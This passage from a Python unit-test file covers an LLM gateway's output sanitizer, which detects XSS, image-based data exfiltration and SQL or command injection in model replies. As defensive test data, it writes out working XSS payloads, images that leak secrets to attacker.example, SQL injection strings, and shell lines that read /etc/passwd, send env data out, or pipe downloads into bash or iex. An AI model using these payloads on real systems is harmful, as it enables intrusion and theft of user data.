"""Unit tests for the L4 output sanitizer (IP-10, IP-6, IP-5, LLM05, TM-R4, TM-R6).

- Mode defaults and guards: on in demo, off in production, eval and both
  shadow tiers; refused in eval and both shadow tiers and with X0.
- Each pattern family, (a) `xss`, (b) `image_exfil`, (c) `sqli_cmdi`, has
  positive tests and negative tests drawn from benign code, config and
  Markdown in the D-BEN-2 style.
- Every Step 5C.1 (H-1, M-1 to M-3, LM-1 to LM-3) and Step 5C.2 (F-1 to F-6)
  audit probe is a regression test in `block` and `neutralize`, as is every
  entity-delimiter probe (`&quot;`, `&#39;`, `&gt;` inside a tag), and every
  Step 5C.3 probe (B-1: the 12 WHATWG start-tag and reference `=` payloads,
  plus tokenizer-divergence shapes; N-1: `union select` and 80 KB of spaces),
  Step 5C.4 probe (B-2: any WHATWG tag name) and Step 5C.5 probe (B-3: the
  Markdown inner image tag starts, such as `<x<img src=...>`).
- Matching runs after NFKC, casefold and one round of HTML-entity decoding.
- `block` returns the uniform 503; `neutralize` releases escaped content.
- A timeout or an exception fails closed in both modes (TM-R4).
- The verdict never reaches the IP-5 egress cache: X0 to X3 rows are
  identical with the flag on or off, and the verdict has its own
  `output_sanitizer_logs` row.

No test touches the network: Groq is `httpx.MockTransport`.
"""

from __future__ import annotations

import asyncio
import dataclasses
import html
import json
import sqlite3
import time
import typing
from typing import Any

import httpx
import pytest
from pydantic import ValidationError

from app.config import EgressVariantName, Settings
from app.layers.l4_egress import EgressDecision, L4EgressScanner
from app.layers.output_sanitizer import (
    FAMILIES,
    OUTPUT_SANITIZER_VERSION,
    PATTERNS,
    OutputSanitizer,
    matching_form,
    structure_form,
    url_host,
)
from app.main import create_app
from app.pipeline import EGRESS_VARIANTS, SANITIZER_VIEW, run_chat
from app.schemas import GatewayRequest
from contracts import Outcome
from contracts.cache_keys import raw_response_hash
from contracts.records import EgressVariant
from telemetry.writer import SQLiteTelemetrySink, output_sanitizer_row
from tests.fakes import TEST_API_KEY, FakeEmbedder, FakeGroq, system_secret
from tests.test_gateway_shell import FakeSink, assert_uniform, make_settings

SECRET = "a-long-eval-secret-0123456789"
PROMPT = "Summarize the release notes."
XSS = "Here: <img src=x onerror=alert(document.cookie)> done"
EXFIL = "Logo: ![status](https://attacker.example/pixel.png?d=SECRET_DATA)"
SQLI = "Try this login: admin' OR '1'='1"


@pytest.fixture(scope="module")
def block() -> OutputSanitizer:
    return OutputSanitizer()


@pytest.fixture(scope="module")
def neutral() -> OutputSanitizer:
    return OutputSanitizer(mode="neutralize")


@pytest.fixture(scope="module")
def l4_scanner() -> L4EgressScanner:
    return L4EgressScanner()


def settings_for(mode: str, **kwargs: Any) -> Settings:
    return Settings(_env_file=None, GATEWAY_MODE=mode, HMAC_SECRET=SECRET, **kwargs)


# Configuration: mode defaults and guards (IP-10, IP-6)


@pytest.mark.parametrize(("mode", "expected"), [
    ("demo", True), ("production", False), ("eval", False), ("shadow_ingress_only", False), ("shadow_full_e2e", False),
])
def test_output_sanitizer_default_resolves_by_mode(mode, expected):
    assert settings_for(mode).ENABLE_OUTPUT_SANITIZER is expected


@pytest.mark.parametrize("mode", ["eval", "shadow_ingress_only", "shadow_full_e2e"])
def test_measured_modes_refuse_the_output_sanitizer(mode):
    with pytest.raises(ValidationError, match="IP-10"):
        settings_for(mode, ENABLE_OUTPUT_SANITIZER=True)


def test_production_may_enable_it_and_demo_may_disable_it():
    assert settings_for("production", ENABLE_OUTPUT_SANITIZER=True).ENABLE_OUTPUT_SANITIZER is True
    assert settings_for("demo", ENABLE_OUTPUT_SANITIZER=False).ENABLE_OUTPUT_SANITIZER is False
    assert settings_for("demo", ENABLE_OUTPUT_SANITIZER="").ENABLE_OUTPUT_SANITIZER is True


@pytest.mark.parametrize("mode", ["production", "demo"])
def test_x0_refuses_the_output_sanitizer(mode):
    """X0 runs no L4 scan; the sanitizer runs after the egress-variant scan, so X0 plus the flag is refused."""
    with pytest.raises(ValidationError, match="X0"):
        settings_for(mode, EGRESS_VARIANT="X0", ENABLE_OUTPUT_SANITIZER=True)
    assert settings_for(mode, EGRESS_VARIANT="X0", ENABLE_OUTPUT_SANITIZER=False).EGRESS_VARIANT == "X0"


def test_sanitizer_settings_defaults_and_parsing(monkeypatch):
    s = Settings(_env_file=None)
    assert (s.OUTPUT_SANITIZER_MODE, s.OUTPUT_IMAGE_ALLOWLIST) == ("block", ())
    monkeypatch.setenv("OUTPUT_IMAGE_ALLOWLIST", " CDN.Example.com , images.example.org., cdn.example.com ")
    monkeypatch.setenv("OUTPUT_SANITIZER_MODE", "neutralize")
    s = Settings(_env_file=None)
    assert s.OUTPUT_IMAGE_ALLOWLIST == ("cdn.example.com", "images.example.org")
    assert s.OUTPUT_SANITIZER_MODE == "neutralize"


@pytest.mark.parametrize("entry", ["https://cdn.example.com", "cdn.example.com/x", "cdn.example.com:443", "*.example.com", "a b"])
def test_allowlist_entries_must_be_bare_hostnames(entry):
    with pytest.raises(ValidationError, match="OUTPUT_IMAGE_ALLOWLIST"):
        Settings(_env_file=None, OUTPUT_IMAGE_ALLOWLIST=entry)


@pytest.mark.parametrize("mode", ["strip", "allow", ""])
def test_unknown_sanitizer_mode_is_refused(mode):
    with pytest.raises(ValidationError):
        Settings(_env_file=None, OUTPUT_SANITIZER_MODE=mode)
    with pytest.raises(ValueError):
        OutputSanitizer(mode=mode)


def test_the_pattern_list_is_versioned_and_tagged():
    assert OUTPUT_SANITIZER_VERSION == "out_san_v4" and FAMILIES == ("xss", "image_exfil", "sqli_cmdi")
    assert {p.family for p in PATTERNS} == {"xss", "sqli_cmdi"}  # image_exfil uses the URL-aware matcher
    assert len({p.name for p in PATTERNS}) == len(PATTERNS)
    assert OutputSanitizer().fingerprint != OutputSanitizer(mode="neutralize").fingerprint
    assert OutputSanitizer().fingerprint != OutputSanitizer(image_allowlist=["cdn.example.com"]).fingerprint


# (a) xss: positives and negatives


XSS_POSITIVES = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=https://x.example/a.js></SCRIPT>",
    "<script\n>fetch('/steal')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    '<body onload="steal()">',
    "<div\tonmouseover = 'x()'>hover</div>",
    '<a href="javascript:alert(1)">click</a>',
    "<a href='  JavaScript:alert(1)'>click</a>",
    "[click me](javascript:alert(document.domain))",
    "javascript:void(fetch('//x.example/'+document.cookie))",
    "&lt;script&gt;alert(1)&lt;/script&gt;",  # one round of entity decoding
    "&#60;img src=x onerror=alert(1)&#62;",
    '<a href="&#x6a;avascript:alert(1)">x</a>',
    "java&#x09;script:alert(1)",  # tab inside the scheme, which browsers drop
    "＜script＞alert(1)",  # fullwidth less-than and greater-than (NFKC)
]

XSS_NEGATIVES = [
    "Use the onerror attribute only on image elements you control.",
    "Never put javascript: URLs in links you render.",
    "The script runs every night at 02:00.",
    "Write <b>bold</b> or <em>emphasis</em> in the template.",
    '<button class="online-status" data-online=1>status</button>',
    "Our JavaScript style guide prefers const over let.",
    "if (a < b && c > d) { return onError(e); }",
    "const handler = { onload: init, onerror: report };",
    "</script> is the closing tag name used in the docs.",
]


@pytest.mark.parametrize("content", XSS_POSITIVES)
def test_xss_positives_block(block, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)


@pytest.mark.parametrize("content", XSS_NEGATIVES)
def test_xss_negatives_are_allowed(block, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("allow", (), content)


# (b) image_exfil: positives and negatives


EXFIL_POSITIVES = [
    "![x](https://attacker.example/p.png?d=secret)",
    "![x](http://attacker.example/p.png)",
    "![x]( <https://attacker.example/p.png> )",
    "![x](//attacker.example/p.png)",
    '![x](https://attacker.example/p.png "title")',
    "![tracking pixel][px]\n\n[px]: https://attacker.example/t.gif?q=1",
    "![px]\n\n[px]: //attacker.example/t.gif",
    '<img src="https://attacker.example/p.png">',
    "<IMG SRC=https://attacker.example/p.png>",
    '<img alt="x" srcset="a.png 1x, https://attacker.example/b.png 2x">',
    '<svg><image href="https://attacker.example/i.svg"/></svg>',
    "![x](https:/attacker.example/p.png)",  # one slash still names a host for special schemes
    "![x](https:\\\\attacker.example\\p.png)",  # backslashes act as slashes
    "![x](https://user@attacker.example:8443/p.png)",
    "![x](https://cdn.example.com.attacker.example/p.png)",  # an allowlisted name as a subdomain prefix
    "![x](https://cdn.example.com@attacker.example/p.png)",  # an allowlisted name as userinfo
    "&#33;[x](https://attacker.example/p.png)",
]

EXFIL_NEGATIVES = [
    "![logo](images/logo.png)",
    "![logo](/static/logo.svg)",
    '<img src="data/plot.png" alt="plot">',
    "See the [docs](https://example.com/docs) and [issues][1].\n\n[1]: https://example.com/issues",
    "![badge](https://cdn.example.com/badge.svg)",  # allowlisted host
    '<img src="https://CDN.Example.com/x.png">',  # allowlisted host, any case
    "Visit https://example.com/image.png for the full picture.",  # a bare URL is not an image
    "Use ![alt](path) syntax to embed an image.",
]


@pytest.mark.parametrize("content", EXFIL_POSITIVES)
def test_image_exfil_positives_block(content):
    result = OutputSanitizer(image_allowlist=["cdn.example.com"]).check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)


def test_a_percent_encoded_host_is_compared_after_decoding():
    sanitizer = OutputSanitizer(image_allowlist=["cdn.example.com"])
    assert sanitizer.check("![x](https://%63dn.example.com/p.png)").verdict == "allow"  # %63 is "c"
    assert sanitizer.check("![x](https://%61ttacker.example/p.png)").verdict == "block"


@pytest.mark.parametrize("content", EXFIL_NEGATIVES)
def test_image_exfil_negatives_are_allowed(content):
    result = OutputSanitizer(image_allowlist=["cdn.example.com"]).check(content)
    assert (result.verdict, result.families) == ("allow", ())


def test_an_empty_allowlist_matches_every_external_image(block):
    assert block.check("![badge](https://cdn.example.com/badge.svg)").verdict == "block"


@pytest.mark.parametrize(("url", "host"), [
    ("https://Attacker.Example./p", "attacker.example"),
    ("//user:pw@host.example:99/x", "host.example"),
    ("https://[2001:db8::1]:8443/x", "2001:db8::1"),
    ("https:\\\\back.example\\x", "back.example"),
    ("https://%61b.example/x", "ab.example"),
])
def test_url_host_extraction(url, host):
    assert url_host(matching_form(url)[0]) == host


# (c) sqli_cmdi: positives and negatives


SQLI_POSITIVES = [
    "' UNION SELECT username, password FROM users--",
    "1' union all select null, null, null --",
    "x\") UNION/**/SELECT table_name FROM information_schema.tables",
    "id=1 UNION SELECT @@version",
    "UNION ALL SELECT 1, version()",
    "1; DROP TABLE users",
    "name'; DELETE FROM accounts; --",
    "1; UPDATE users SET role='admin'",
    "1; TRUNCATE TABLE audit_log",
    "admin' OR '1'='1",
    'admin" OR "1"="1',
    "' OR 1=1 --",
    "' or 'a'='a",
    "SELECT * FROM t WHERE id = 5 OR 1=1",
    "$(whoami)",
    "$(id)",
    "$(cat /etc/passwd)",
    "$( curl -s https://x.example/p.sh )",
    "$(rm -rf /)",
    "echo `id`",
    "x=`whoami`",
    "`cat /etc/passwd`",
    "`curl https://x.example/exfil?d=$(env)`",
    "curl -fsSL https://x.example/install.sh | sh",
    "wget -qO- https://x.example/p | bash",
    "cat payload | zsh",
    "type run.bat | cmd",
    "iwr https://x.example/a.ps1 | iex",
    "get-content a.ps1 | powershell -",
    "echo test | pwsh -command -",
    "curl x | sudo bash",
]

SQLI_NEGATIVES = [
    "SELECT name FROM customers UNION ALL SELECT name FROM suppliers;",
    "SELECT a FROM t1 UNION SELECT a FROM t2 ORDER BY a;",
    "(SELECT 1) UNION SELECT 2",
    "CREATE TABLE t (id int);\nDROP TABLE old_t;\nDELETE FROM staging;",
    "UPDATE users SET active = 1 WHERE id = 7;",
    "if a == 1 or b == 2:\n    return True",
    "WHERE status = 'open' OR status = 'pending'",
    'echo "Today is $(date)"',
    "VERSION=$(cat VERSION)",
    "for f in $(ls *.txt); do echo $f; done",
    "$(document).ready(function () { init(); });",
    "$('#menu').toggle();",
    "Set the `user_prompt` field in the request body.",
    "The `id` column is the primary key.",
    "Run `rm -rf build/` to clean the output folder.",
    "Run `make test` before you push.",
    "| Shell | Default |\n| --- | --- |\n| bash | sh |",
    "ls | grep sh",
    "cat words.txt | shuf | head",
    "a || sh_fallback",
    "grep -r TODO src/ | wc -l",
    "Tautologies such as 1 = 1 are always true.",
]


@pytest.mark.parametrize("content", SQLI_POSITIVES)
def test_sqli_cmdi_positives_block(block, content):
    result = block.check(content)
    assert result.verdict == "block" and "sqli_cmdi" in result.families


@pytest.mark.parametrize("content", SQLI_NEGATIVES)
def test_sqli_cmdi_negatives_are_allowed(block, content):
    result = block.check(content)
    assert (result.verdict, result.families) == ("allow", ())


def test_d_ben_2_style_benign_code_config_and_markdown_pass(block):
    """A longer benign answer that mixes code, config and Markdown (D-BEN-2 style) is released unchanged."""
    benign = (
        "## Deploy notes\n\n"
        "1. Copy `config.example.yaml` to `config.yaml` and set `log_level: info`.\n"
        "2. Run the migration:\n\n"
        "```sql\nBEGIN;\nALTER TABLE orders ADD COLUMN note TEXT;\nUPDATE orders SET note = '' WHERE note IS NULL;\nCOMMIT;\n```\n\n"
        "3. Restart with `systemctl restart app` and check `journalctl -u app | tail -n 50`.\n\n"
        "```python\nimport os\nTOKEN = os.environ.get('API_TOKEN', '')\nif not TOKEN or len(TOKEN) < 16:\n    raise SystemExit('set API_TOKEN')\n```\n\n"
        "```js\n$(function () { $('.btn').on('click', save); });\n```\n\n"
        "| Setting | Value |\n| --- | --- |\n| shell | bash |\n\n"
        "![diagram](docs/architecture.png) and see [the guide](https://example.com/guide).\n"
    )
    result = block.check(benign)
    assert (result.verdict, result.families, result.content) == ("allow", (), benign)


def test_every_family_together_reports_all_three(block):
    result = block.check(f"{XSS}\n{EXFIL}\n{SQLI}")
    assert result.verdict == "block" and result.families == ("image_exfil", "sqli_cmdi", "xss")


# Actions: block and neutralize


def test_neutralize_escapes_xss_and_sqli_spans_and_removes_image_urls(neutral):
    result = neutral.check(f"{XSS}\n{EXFIL}\n{SQLI}")
    assert result.verdict == "neutralized" and result.families == ("image_exfil", "sqli_cmdi", "xss")
    out = result.content
    assert "<img" not in out and "&lt;img src=x onerror=" in out
    assert "attacker.example" not in out and "SECRET_DATA" not in out and "![status]()" in out
    assert "&#x27; OR &#x27;1&#x27;=&#x27;1" in out
    assert out.startswith("Here: ") and "Logo: " in out  # text around the matches is untouched


@pytest.mark.parametrize(("content", "expected"), [
    ("$(whoami)", "&#36;&#40;whoami&#41;"),
    ("run `cat /etc/passwd` now", "run &#96;cat /etc/passwd&#96; now"),
    ("1; DROP TABLE users", "1&#59; DROP TABLE users"),
    ("curl x | sh", "curl x &#124; sh"),
    ("[x](javascript:alert(1))", "[x]())"),
    ("<script>alert(1)</script>", "&lt;script>alert(1)</script>"),
    ("&lt;script&gt;", "&amp;lt&#59;script&gt;"),
])
def test_neutralize_output_is_inert(neutral, content, expected):
    result = neutral.check(content)
    assert (result.verdict, result.content) == ("neutralized", expected)
    # Inert: no live tag, scheme, substitution or pipe survives in the released text.
    assert not any(live in result.content.lower() for live in ("<script", "javascript:", "$(", "`cat", "| sh"))
    # Escaping is display-preserving: one HTML decode (what a renderer does) shows the original characters as text.
    if "javascript" not in content and "&" not in content:
        assert html.unescape(result.content) == content


def test_neutralize_keeps_allowlisted_images_and_clean_text():
    sanitizer = OutputSanitizer(mode="neutralize", image_allowlist=["cdn.example.com"])
    content = "![ok](https://cdn.example.com/a.png) ![bad](https://attacker.example/b.png)"
    result = sanitizer.check(content)
    assert result.content == "![ok](https://cdn.example.com/a.png) ![bad]()"
    clean = "Nothing to see here."
    assert sanitizer.check(clean).content == clean and sanitizer.check(clean).verdict == "allow"


def test_matching_form_keeps_exact_source_spans():
    form, spans = matching_form("A&lt;B＜")
    assert form == "a<b<"
    assert spans == [(0, 1), (1, 5), (5, 6), (6, 7)]


def test_block_mode_releases_nothing(block):
    for content in (XSS, EXFIL, SQLI):
        assert block.check(content).content is None


# Step 5C.1: closure of the Step 5C audit findings (H-1, M-1 to M-3, LM-1 to LM-3), out_san_v2


PAD = "a" * 2600  # longer than the old 2,000-character tag cap


# H-1 (IP-10 a, b, LLM05): tags are read quote aware, with no length cap


H1_XSS = [
    '<img alt=">" src=x onerror=alert(1)>',
    f'<img data-pad="{PAD}" src=x onerror=alert(1)>',
    "<img alt='>' src=x onerror=alert(1)>",
    '<img src="x"onerror=alert(1)>',  # a handler right after a closing quote is a second attribute
    f'<a data-pad="{PAD}" href="javascript:alert(1)">x</a>',
]


@pytest.mark.parametrize("content", H1_XSS)
def test_h1_quoted_gt_and_long_attributes_do_not_hide_a_handler(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and "<img" not in released.content and "<a " not in released.content


@pytest.mark.parametrize("content", [
    '<img alt=">" src="https://attacker.example/p.png?d=S">',
    f'<img data-pad="{PAD}" src="https://attacker.example/p.png?d=S">',
])
def test_h1_quoted_gt_and_long_attributes_do_not_hide_an_external_image(block, neutral, content):
    assert (block.check(content).verdict, block.check(content).families) == ("block", ("image_exfil",))
    released = neutral.check(content)
    assert released.verdict == "neutralized" and "attacker.example" not in released.content


def test_h1_a_handler_inside_a_quoted_value_is_not_an_attribute(block):
    content = '<a title="x onerror=y" href="/docs">docs</a>'
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


@pytest.mark.parametrize("content", [
    "<a '\"" * 4000,  # alternating quotes inside tags
    "<img alt=\"" * 2000 + "a" * 4000,  # unclosed quotes
    "<img " + "a=" * 9000,
    "![" * 10000,
    "![a[b" * 4000,
    "![" + "\n " * 9000,
    "&#" + "0" * 20000,
    ";/*" * 6000,
    "$(" + "a/" * 9000,
    "x |" * 7000,
])
def test_h1_worst_case_runtime_on_20_kb_hostile_input_stays_fast(block, content):
    """Quote-aware tag bodies with no cap stay linear: each item is atomic and the alternatives start differently."""
    started = time.perf_counter()
    block.check(content)
    assert (time.perf_counter() - started) < 1.0  # measured at 6 to 32 ms; the bound only catches a blow-up


# M-1 (IP-10): case-sensitive one-round entity decoding, numeric references with any number of digits


M1_XSS = [
    '<a href="java&Tab;script:alert(1)">click</a>',
    "[x](java&NewLine;script:alert(1))",
    '<a href="&#x000000006a;avascript:alert(1)">click</a>',
    '<a href="&#00000000106;avascript:alert(1)">click</a>',
    '<a href="&#X6A;avascript:alert(1)">click</a>',
]


@pytest.mark.parametrize("content", M1_XSS)
def test_m1_entities_decode_case_sensitively_and_without_a_digit_cap(block, neutral, content):
    assert (block.check(content).verdict, block.check(content).families) == ("block", ("xss",))
    assert neutral.check(content).verdict == "neutralized"


@pytest.mark.parametrize(("entity", "decoded"), [
    ("&Tab;", "\t"), ("&NewLine;", "\n"), ("&tab;", "&tab;"), ("&#x000000006a;", "j"), ("&#00000000106;", "j"),
    ("&#x110000;", "�"), ("&#1114112;", "�"), ("&#0;", "�"), ("&#xD800;", "�"),
    ("&#" + "9" * 5000 + ";", "�"), ("&#x" + "f" * 5000 + ";", "�"), ("&#x" + "0" * 5000 + "41;", "a"),
])
def test_m1_matching_form_decodes_one_round_case_sensitively(entity, decoded):
    """Huge numbers never raise ValueError or OverflowError (int() digit limits included); `casefold()` runs after."""
    form, spans = matching_form(entity)
    assert form == decoded.casefold()
    assert all(span == (0, len(entity)) for span in spans) or form == entity


def test_m1_casefold_runs_after_the_decode_and_spans_stay_exact():
    form, spans = matching_form("A&Tab;B&LT;")
    assert form == "a\tb<"
    assert spans == [(0, 1), (1, 6), (6, 7), (7, 11)]


# M-2 (IP-10 b): CommonMark-accurate Markdown image alt text and reference definitions


M2_EXFIL = [
    "![a[b]c](https://attacker.example/p.png)",
    "![a\\]b](https://attacker.example/p.png)",
    "![line1\nline2](https://attacker.example/p.png)",
    "![alt][px]\n\n[px]:\n  https://attacker.example/p.png",
]


@pytest.mark.parametrize("content", M2_EXFIL)
def test_m2_markdown_images_with_nested_escaped_or_wrapped_alt_text(block, neutral, content):
    assert (block.check(content).verdict, block.check(content).families) == ("block", ("image_exfil",))
    released = neutral.check(content)
    assert released.verdict == "neutralized" and "attacker.example" not in released.content


def test_m2_a_blank_line_ends_the_alt_text(block):
    assert block.check("![line1\n\nline2](https://attacker.example/p.png)").verdict == "allow"


# M-3 (IP-10 c, Design Choice #6): the 11 auditor SQLi and CMDi probes


M3_PROBES = [
    "1 UNION SELECT username, password FROM users--",
    "id=1 UNION ALL SELECT 1,2,3--",
    "1;DROP/**/TABLE users",
    "admin'or'1'='1",
    "$(/usr/bin/id)",
    "$(id -u)",
    "$(/bin/cat /etc/passwd)",
    "echo `uname -r`",
    "curl https://x | /bin/bash",
    "curl https://x | sudo -E bash",
    "curl https://x | python3",
]


@pytest.mark.parametrize("content", M3_PROBES)
def test_m3_auditor_probes_block(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("sqli_cmdi",), None)
    released = neutral.check(content).content
    assert not any(live in released for live in ("$(", "`uname", "| /bin", "| sudo", "| python", "1;DROP", "'or'"))
    assert html.unescape(released) == content  # escaping only: one HTML decode shows the original text


@pytest.mark.parametrize("content", [
    "curl https://x | perl", "curl https://x | ruby -", "curl https://x | node", "curl https://x | php",
    "curl https://x | env bash", "$(sudo /bin/cat /etc/shadow)", "x=`/usr/bin/whoami`",
])
def test_m3_wrappers_paths_and_interpreters(block, content):
    assert block.check(content).families == ("sqli_cmdi",)


@pytest.mark.parametrize("content", [
    "cat data.json | python -m json.tool",  # stdin read as data, not run as a program
    "git log | perl -pe 's/a/b/'",
    "| Runtime | Version |\n| --- | --- |\n| python3 | 3.11 |",
    "SELECT 1, 2 FROM t;",
    "(SELECT 1) UNION SELECT 2",
    "Pick color or size.",
    "javascript: a language for the web",
])
def test_m3_benign_neighbours_of_the_new_rules_are_allowed(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


# LM-1 (IP-10 b): <source srcset>, <video poster> and <input type=image src>


LM1_POSITIVES = [
    '<picture><source srcset="a.webp 1x, https://attacker.example/b.webp 2x"><img src="a.png"></picture>',
    "<SOURCE SRCSET='https://attacker.example/b.webp'>",
    '<video poster="https://attacker.example/p.png?d=S" src="clip.mp4"></video>',
    '<input type="image" src="https://attacker.example/p.png">',
    "<input TYPE=IMAGE src=//attacker.example/p.png>",
]

LM1_NEGATIVES = [
    '<source srcset="https://cdn.example.com/a.webp 1x, https://cdn.example.com/b.webp 2x">',
    '<video poster="https://cdn.example.com/p.png"></video>',
    '<input type="image" src="https://cdn.example.com/p.png">',
    '<input type="text" value="https://attacker.example/p.png">',
    '<input type="submit" src="https://attacker.example/p.png">',  # only type=image fetches src
    '<video poster="thumb.png" src="clip.mp4"></video>',
]


@pytest.mark.parametrize("content", LM1_POSITIVES)
def test_lm1_source_video_poster_and_input_image_are_images(content):
    sanitizer = OutputSanitizer(image_allowlist=["cdn.example.com"])
    result = sanitizer.check(content)
    assert (result.verdict, result.families) == ("block", ("image_exfil",))
    released = OutputSanitizer(mode="neutralize", image_allowlist=["cdn.example.com"]).check(content).content
    assert "attacker.example" not in released


@pytest.mark.parametrize("content", LM1_NEGATIVES)
def test_lm1_allowlisted_or_non_fetching_elements_are_allowed(content):
    result = OutputSanitizer(image_allowlist=["cdn.example.com"]).check(content)
    assert (result.verdict, result.families) == ("allow", ())


def test_lm1_every_srcset_candidate_is_checked():
    sanitizer = OutputSanitizer(mode="neutralize", image_allowlist=["cdn.example.com"])
    content = '<source srcset="https://cdn.example.com/a.webp 1x, https://attacker.example/b.webp 2x">'
    assert sanitizer.check(content).content == '<source srcset="https://cdn.example.com/a.webp 1x,  2x">'


# LM-2 (IP-10 a): a javascript: URI with spaces inside <...>


def test_lm2_javascript_uri_with_spaces_in_angle_brackets(block, neutral):
    content = "[x](<javascript: alert(1)>)"
    assert (block.check(content).verdict, block.check(content).families) == ("block", ("xss",))
    assert neutral.check(content).content == "[x](<>)"


# LM-3 (IP-10 b): tab, CR and LF are dropped from a quoted URL before the host is read


@pytest.mark.parametrize("noise", ["&#9;", "&Tab;", "&#10;", "&#13;", "\t", "\n"])
def test_lm3_url_noise_cannot_split_an_allowlisted_host_prefix(noise):
    content = f'<img src="https://cdn.example.com{noise}.attacker.example/p.png">'
    sanitizer = OutputSanitizer(image_allowlist=["cdn.example.com"])
    (finding,) = sanitizer.findings(content)
    assert finding.family == "image_exfil"
    form, _ = matching_form(content[finding.start:finding.end])
    assert url_host(form) == "cdn.example.com.attacker.example"
    assert sanitizer.check(content).verdict == "block"
    released = OutputSanitizer(mode="neutralize", image_allowlist=["cdn.example.com"]).check(content).content
    assert released == '<img src="">'


def test_lm3_url_host_strips_tab_cr_and_lf():
    assert url_host("https://cdn.example.com\t.attacker.example/p.png") == "cdn.example.com.attacker.example"
    assert url_host("https://cdn.exa\r\nmple.com/p.png") == "cdn.example.com"


# Step 5C.2: closure of the Step 5C.1 audit findings (F-1 to F-7), out_san_v3


# F-1 (IP-10 a, LLM05, TM-R6): a quote opens an attribute value only right after `=`


F1_XSS = [
    "<img src=x' onerror=alert(1)> it's fine",
    '<img src=x" onerror=alert(1)> he said "hi"',
    '<img "x onerror=alert(1)> say "hi"',
    "<svg x=a' onload=alert(1)> don't",
]


@pytest.mark.parametrize("content", F1_XSS)
def test_f1_a_stray_quote_cannot_swallow_a_handler(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("xss",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.families == ("xss",)
    assert "<img" not in released.content and "<svg" not in released.content


@pytest.mark.parametrize("content", [
    '<a title="x onerror=y" href="/docs">docs</a>',  # a quote right after `=` still opens a value
    "<a title='it is onload=x' href=/docs>it's fine</a>",
    "<a href=/docs title=it's>it's fine</a>",
    "Don't write <b>bold</b> everywhere, it's loud.",
])
def test_f1_quoted_values_and_apostrophes_in_prose_stay_allowed(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


# F-2 (IP-10 b, LM-3 residual): tab, CR and LF from a character reference inside an unquoted value


F2_EXFIL = [
    "<img src=/&#9;/attacker.example/p.png?d=S>",
    "<img src=/&NewLine;/attacker.example/p.png?d=S>",
    "<img src=h&#9;ttps://attacker.example/p.png?d=S>",
]


@pytest.mark.parametrize("content", F2_EXFIL)
def test_f2_reference_whitespace_in_an_unquoted_value_is_dropped(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and released.content == "<img src=>"


def test_f2_reference_whitespace_cannot_split_an_allowlisted_host_in_an_unquoted_value():
    content = "<img src=https://cdn.example.com&#9;.attacker.example/p.png>"
    sanitizer = OutputSanitizer(image_allowlist=["cdn.example.com"])
    result = sanitizer.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)
    (finding,) = result.findings
    assert url_host(matching_form(content[finding.start:finding.end])[0]) == "cdn.example.com.attacker.example"
    released = OutputSanitizer(mode="neutralize", image_allowlist=["cdn.example.com"]).check(content)
    assert released.verdict == "neutralized" and released.content == "<img src=>"


@pytest.mark.parametrize("content", [
    "<img src=/\t/attacker.example/p.png>",  # a literal tab ends an unquoted value: the browser fetches `/`
    "<img src=https://cdn.example.com/a.png alt=x&#9;y>",
    "<img src=https://cdn.example.com/a&#9;b.png>",
])
def test_f2_literal_whitespace_still_ends_an_unquoted_value(content):
    result = OutputSanitizer(image_allowlist=["cdn.example.com"]).check(content)
    assert (result.verdict, result.families) == ("allow", ())


# F-3 (IP-10 b, M-2 residual): nested alt text to any depth, definitions inside block containers


F3_EXFIL = [
    "![a[b[c]d]e](https://attacker.example/p.png)",
    "![a][px]\n\n> [px]: https://attacker.example/p.png",
    "![a][px]\n\n- [px]: https://attacker.example/p.png",
]


@pytest.mark.parametrize("content", F3_EXFIL)
def test_f3_markdown_images_with_deep_alt_text_or_container_definitions(block, neutral, content):
    result = block.check(content)
    assert (result.verdict, result.families, result.content) == ("block", ("image_exfil",), None)
    released = neutral.check(content)
    assert released.verdict == "neutralized" and "attacker.example" not in released.content


@pytest.mark.parametrize("content", [
    "![a[b[c[d[e]d]c]b]a](https://attacker.example/p.png)",
    "![a\\[b[c]d](https://attacker.example/p.png)",
    "![x][px]\n\n1. [px]: https://attacker.example/p.png",
    "![x][px]\n\n> - [px]: https://attacker.example/p.png",
    "![x][px]\n\n> [px]:\n> https://attacker.example/p.png",
    "![x][]\n\n* [x]: //attacker.example/p.png",
])
def test_f3_more_nesting_and_container_shapes(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("block", ("image_exfil",))


@pytest.mark.parametrize("content", [
    "![a[b\n\nc]d](https://attacker.example/p.png)",  # a blank line ends the open brackets
    "\\![a](https://attacker.example/p.png)",  # an escaped `!` makes this a plain link
    "[a][px]\n\n> [px]: https://attacker.example/p.png",  # a link reference, not an image
    "![a][px]\n\n> [other]: https://attacker.example/p.png",
])
def test_f3_benign_neighbours_are_allowed(block, content):
    assert (block.check(content).verdict, block.check(content).families) == ("allow", ())


# F-4 (TM-R2, IP-7, LLM10): no quadratic backtracking in javascript_uri_in_tag


F4_HOSTILE = {
    "unquoted": "<a href=" + " " * 80_000,
    "single-quote": "<a href='" + " " * 80_000,
    "double-quote": "<a href=\"" + " " * 80_000,  # also the quote-then-spaces shape of the UNION and tautology rules
    "number-spaces": "x=1" + " " * 80_000,  # union_select_after_number
    "equals-flood": "<a " + "= " * 40_000,
    "markdown-target": "![a](" + " " * 80_000,
    "quote-markers": ">    " * 20_000,
    "union-select": "union select " + " " * 80_000,  # union_select_probe (Step 5C.3 N-1), about 430 ms before
}


@pytest.mark.parametrize("content", list(F4_HOSTILE.values()), ids=list(F4_HOSTILE))  # short ids (Windows env cap)
